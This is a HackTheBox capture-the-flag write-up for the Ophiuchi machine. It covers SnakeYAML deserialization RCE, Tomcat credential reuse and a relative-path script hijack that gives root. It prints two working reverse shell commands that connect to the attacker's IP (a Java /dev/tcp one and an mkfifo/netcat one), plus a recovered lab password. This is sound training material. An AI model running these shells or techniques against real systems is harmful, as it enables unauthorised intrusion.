title: HackTheBox Ophiuchi Write-up
---

<h2>Overview</h2>

Ophiuchi is a Medium-rated Hackthebox linux machine. I gain a foothold via yaml deserialization on a website's user input, allowing RCE and leading to a shell as the user tomcat. From there, exposed credentials allow a quick escalation to the user "admin". As admin, I discover I'm able to run a go script as superuser. The file loads scripts without specifying full filepaths, allowing script hijacking and command execution as root.

<h2>Initial Enumeration</h2>

Initial nmap enumeration reveals two ports open: SSH on port 22, and Apache Tomcat site on port 8080.

Heading over to port 8080 on a browser reveals an "Online YAML Parser":

Testing some gibberish input and clicking parse, I get redirected to this security message:

Looking to find more clues, I look up the meaning of this unfamiliar word "Ophiuchi".

Conveniently, the first link shown when I search for "yaml exploit" returns a "SnakeYAML deserialization" blog entry. This could be the name of the box hinting at the entrypoint.

<h2>Exploiting SnakeYAML -> RCE</h2>

The blog author details a vulnerability in snakeyaml where, if user input is directly passed to a function, the application can be vulnerable to deserialization leading to RCE.
First on my local host I open an HTTP server, and then on the target website I test the payload provided by the blog.

![image](https://user-images.githubusercontent.com/44827973/141243558-c3d44771-864f-41d6-9e2e-8d4896256bec.png)

The web server attempts to make contact with my host. Looks like the security message is either a trick or not up to date, as I can clearly get some form of execution going.

As explained by the blog, snake yaml can interpret Java class constructors in the yaml payload. Upon parsing the provided payload, snake YAML invokes ScriptEngineManager which as we can see attempted to access the "/META-INF/services/javax.script.ScriptEngineFactory" endpoint.

An exploit for this is provided in this github repo:
https://github.com/artsploit/yaml-payload

Upon parsing our yaml payload, the web server will look for the file "/META-INF/services/javax.script.ScriptEngineFactory" and read its contents. It will then attempt to execute the class file pointed to by this file. This exploit aims to abuse this by creation of a Java class file containing arbitrary commands which will force the web server to execute.

I created a folder tree similar to the exploit, in order for the server to locate the header file "javax.script.ScriptEngineFactory" and the class file containing the code I want executed. This is how it ends up looking:

![image](https://user-images.githubusercontent.com/44827973/141244440-6ec163f4-93c3-4d29-aefd-1128d5a6cf6b.png)

Within the javax.script.ScriptEngineFactory file, I specify the package and class I want executed, which will be my exploit.class within my snakeyaml directory:
`snakeyaml.exploit`

I copied the repo's .java file inside my package directory "snakeyaml", and make a modification of the comand to get a reverse shell. Note how I rename the package and class - Java classes need to be the same name as the filename.

Here is the reverse shell command I use:

```
Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.6/443;cat <&5 | while read line; do $line 2>&5 >&5; done"});
```

After modifying, I compile it with "javac exploit.java".

I start a reverse shell listener with netcat.
When I execute my yaml payload again on the website, I get a hit on my HTTP server with response 200 (meaning OK - there were no errors in retrieving the files). I get a reverse shell as "tomcat".

<h2>tomcat -> admin</h2>

The first thing I do with a shell is to upgrade it to an interactive shell. I check if python or python3 is installed, and then run a python command to get an interactive shell.

`python3 -c 'import pty;pty.spawn("/bin/bash")'`

For whatever reason, I kept getting EOL errors, so I spawned another shell on top and then ran the command without issues.

Seeing as Apache Tomcat is installed on the machine, it's worth checking the tomcat-users file for credentials. I'm fortunate enough to find credentials for "admin".

The tomcat-users.xml file was found in /opt/tomcat/conf/tomcat-users.xml.

The credentials found:
`admin:whythereisalimit`

I am able to use these creds to switch to admin user:

Now I am able to read user.txt:

<h2>admin -> root</h2>

"sudo -l" reveals one command I can run as root:

![image](https://user-images.githubusercontent.com/44827973/141444962-f00d087a-1957-483e-a7fc-c4fea04ba7d9.png)

It reveals I can run a go file as root. Although it might seem secure, as it only permits us to run this one file as root, we will soon find out.

Although I can't write to the target .go file, I can read it.

![image](https://user-images.githubusercontent.com/44827973/141445056-e35672a0-6335-461f-9414-8e52c6bb0c1a.png)

Here are it's contents.

![image](https://user-images.githubusercontent.com/44827973/141448208-677811c2-9208-4cf4-86ed-c758ddd77fc8.png)

I can see it references two files. The script appears to do the following:

1. read from "main.wasm"
2. check for what main.wasm returns
3. if it returns anything other than 1, "Not ready to deploy" is printed, and execution ends here.
4. if it reads 1, it prints "Ready to deploy", and executes "deploy.sh"

I check what privileges I have on main.wasm and deploy.sh files:

![image](https://user-images.githubusercontent.com/44827973/141447909-89eaef5b-8a5d-42c1-b174-2145653cf592.png)

I'm unable to write to either of these files. If I could simply replace deploy.sh and pass the check in step 2 I could have anything I want executed, but I can't. How else could I exploit this script's behaviour?

<h2>Script Hijacking</h2>

A common vulnerability arises when scripts that are executed without their full filepath specified. As you can see in index.go, the script handles two file inputs which do not have full filepath specified:

1. "main.wasm", which appears to be read by the script, and
2. "deploy.sh", which is executed by the script.

They developer who wrote this script obviously intended for these files to be read from the same directory containing index.go. but if I were to run index.go from another location, it would look inside that location for these files. If I create my own main.wasm and deploy.sh in a directory I have write permissions, and execute the sudo command from that location, I could "hijack" index.go with my own scripts.

There are two things I need in order to hijack index.go:

1. How to get "main.wasm" to return 1
2. replace deploy.sh code with a reverse shell

Step 2 is easy, step 1 will require some investigation.

<h3>Understanding main.wasm</h3>

As per fileinfo.com:

[https://fileinfo.com/extension/wasm](https://fileinfo.com/extension/wasm)

> A WASM file contains binary code saved in the WebAssembly format that is run in web browsers, such as Google Chrome, Mozilla Firefox, Microsoft Edge, and Apple Safari. It stores a module, which is binary WebAssembly code that has been compiled from C, C++, or Rust textual code, that can be imported into webpages and apps and used via JavaScript.

The contents of main.wasm are in an unreadable format, and I'll need a tool to extract the text from it to see what it does. In comes The WebAssembly Binary Toolkit:

[https://github.com/WebAssembly/wabt](https://github.com/WebAssembly/wabt)

This toolkit comes with a range of tools that allow us to play around with webassembly files. I find a useful tool in "wasm-decompile", which allows me to understand what main.wasm does, in a C-like code layout.

![image](https://user-images.githubusercontent.com/44827973/141610140-84978f94-61af-40b7-8243-9fae2e13a51e.png)

Unfortunately, there doesn't seem to be a way to simply edit this text to return 1, and recompile it. For that, we need to modify the .wat (WebAssembly text) file from which main.wasm was compiled.

"wasm2wat" allows me to convert the .wasm back to its .wat format.

![image](https://user-images.githubusercontent.com/44827973/141610229-22fa2c31-1276-460b-8dc4-f5959f55fa2e.png)

My best guess is that the "result i32 | i32.const 0" part is equivalent to "return 0". This seems consistent with the index.go script, which reads the "result" string.

I extract the .wat file and modify this part, changing a single integer so that hopefully "result 1" is what I get.

![image](https://user-images.githubusercontent.com/44827973/141610345-11d65d53-30b2-40db-8708-d470b88b5a1a.png)

I back up the original main.wasm, and create a new main.wasm by using wat2wasm.

![image](https://user-images.githubusercontent.com/44827973/141610394-9f43fe56-1b0f-4afe-805c-5f5bac9a2932.png)

My modification appears to have the intended effect - the decompiled C-like code now returns 1.

![image](https://user-images.githubusercontent.com/44827973/141610432-484714a0-ae70-4ba6-82ad-29d78f44d967.png)

Now the hard part is done. I upload the new main.wasm to admin's home directory.

<h2>I Am Root</h2>

Now that I've got a main.wasm that will return 1 when called by index.go, I'm hoping I can get deploy.sh to execute as root.

Still in admin's home directory, I create a deploy.sh file containing a simple command. If assumptions are correct, this will create a text file in /var/tmp as root.

I run the sudo command and find deploy.sh successfully executed as root:

I swap out the command for a reverse shell. I start a netcat listener on my attacker host, then run the sudo command:

![image](https://user-images.githubusercontent.com/44827973/141610573-3a8a938c-543c-4efb-a866-a2d423f87804.png)

reverse shell command:
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 4444 >/tmp/f`

I get my reverse shell as root, and am able to read the contents of /root/root.txt:
